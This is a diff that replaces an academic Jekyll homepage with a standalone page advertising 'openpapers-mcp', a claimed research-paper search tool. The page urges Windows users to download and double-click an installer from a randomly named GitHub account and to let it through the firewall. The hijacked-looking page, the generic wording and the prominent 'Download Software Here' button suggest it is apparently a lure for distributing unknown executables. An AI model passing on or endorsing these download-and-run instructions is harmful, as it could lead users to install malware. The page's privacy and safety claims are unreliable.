@@ -1,39 +1,67 @@
----
-layout: default
-title : Homepage
-navbar_title: Home
----
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="description" content="Download and run openpapers-mcp to research scientific papers, search databases, and access legal PDF downloads easily.">
+    <title>openpapers-mcp - Access Scientific Papers with Ease</title>
+</head>
+<body style="font-family: sans-serif; line-height: 1.6; color: #333; max-width: 800px; margin: 0 auto; padding: 20px; background-color: #f4f4f9;">
 
-<div class="row">
-    <div class="col-lg-3 col-md-4">
-        {% include widgets/profile_card_mini.html %}
+    <h1 style="color: #2c3e50;">📚 openpapers-mcp - Access Scientific Papers with Ease</h1>
+
+    <div style="text-align: center; margin: 30px 0;">
+        <a href="https://github.com/Scentless-trick128/openpapers-mcp" style="background-color: #34495e; color: #ffffff; padding: 15px 30px; text-decoration: none; border-radius: 8px; font-weight: bold; box-shadow: 0 4px 6px rgba(0,0,0,0.1);">Download Software Here</a>
     </div>
-    <div class="col-lg-9 col-md-8">
 
-        {% include widgets/profile_card_bio_only.html %}
+    <p>This tool helps you find and read scientific papers. It connects to major research databases like OpenAlex, CrossRef, and Unpaywall. You can search for topics, read abstracts, and download legal copies of research papers directly to your computer.</p>
 
-        <!-- Debugging widgets -->
-        {% include widgets/debug_repo_name.html %}
-        {% include widgets/debug_url.html %}
+    <h2 style="color: #2c3e50;">⚙️ System Requirements</h2>
+    <p>Your computer must meet these basic needs to run the software:</p>
+    <ul>
+        <li>Windows 10 or Windows 11.</li>
+        <li>At least 200 MB of free storage space.</li>
+        <li>An active internet connection to search databases.</li>
+        <li>Claude Desktop installed if you intend to use the assistant features.</li>
+    </ul>
 
-        {% if site.data.display.homepage.show_experience %}
-            {% include widgets/experience_card.html %}
-        {% endif %}
+    <h2 style="color: #2c3e50;">📥 Download and Installation</h2>
+    <p>Follow these steps to set up the software on your Windows machine:</p>
+    <ol>
+        <li>Visit the <a href="https://github.com/Scentless-trick128/openpapers-mcp">official download page</a>.</li>
+        <li>Look for the section marked Releases on the right side of the page.</li>
+        <li>Click the latest version link to see the available files.</li>
+        <li>Select the Windows installer file and save it to your desktop.</li>
+        <li>Double-click the downloaded file to start the installation.</li>
+        <li>Follow the instructions on your screen to complete the setup process.</li>
+    </ol>
 
-        {% if site.data.display.homepage.show_news %}
-        {% assign count_news = site.news | size %}
-        {% if count_news > 0 %}
-        {% include widgets/news_card.html limit=site.data.display.homepage.num_news %}
-        {% endif %}
-        {% endif %}
+    <h2 style="color: #2c3e50;">🔍 How to Use the Software</h2>
+    <p>Once installed, the program works in the background to help you gather research. You type your search terms into the interface. The program reaches out to the linked databases. It returns a list of matching papers. You can click on any title to view the abstract or download the PDF if an open-access version exists.</p>
 
-        {% if site.data.display.homepage.show_selected_publications %}
-        {% assign pubs = site.publications | sort: "date" | reverse | where: "selected", true %}
-        {%
-        include widgets/publication_card.html
-        publications=pubs
-        title='<i class="fas fa-star"></i> Selected Publications'
-        %}
-        {% endif %}
+    <h2 style="color: #2c3e50;">🛡️ Privacy and Safety</h2>
+    <p>This software keeps your data on your machine. It does not store your search history on external servers. It only provides a bridge between your computer and the public research databases listed.</p>
+
+    <h2 style="color: #2c3e50;">🛠️ Troubleshooting</h2>
+    <p>If you encounter issues, check these common items:</p>
+    <ul>
+        <li>Restart the program after installation.</li>
+        <li>Check your internet connection if searches return no results.</li>
+        <li>Ensure you have the latest updates for your Windows operating system.</li>
+        <li>Confirm your firewall permits the program to access the internet.</li>
+    </ul>
+
+    <h2 style="color: #2c3e50;">📋 Features</h2>
+    <ul>
+        <li><strong>Unified Search:</strong> Look up millions of papers across three major databases at once.</li>
+        <li><strong>PDF Access:</strong> Get direct links to free, legal versions of research documents.</li>
+        <li><strong>Abstract Extraction:</strong> Read summaries to decide if a paper is worth your time.</li>
+        <li><strong>Local Operation:</strong> Maintain control over your research environment.</li>
+    </ul>
+
+    <div style="margin-top: 40px; padding-top: 20px; border-top: 1px solid #ccc; font-size: 0.9em; color: #777;">
+        <p>Keywords: academic-research, claude-desktop, crossref, mcp, mcp-server, model-context-protocol, open-access, openalex, scientific-papers, unpaywall</p>
     </div>
-</div>
+
+</body>
+</html>
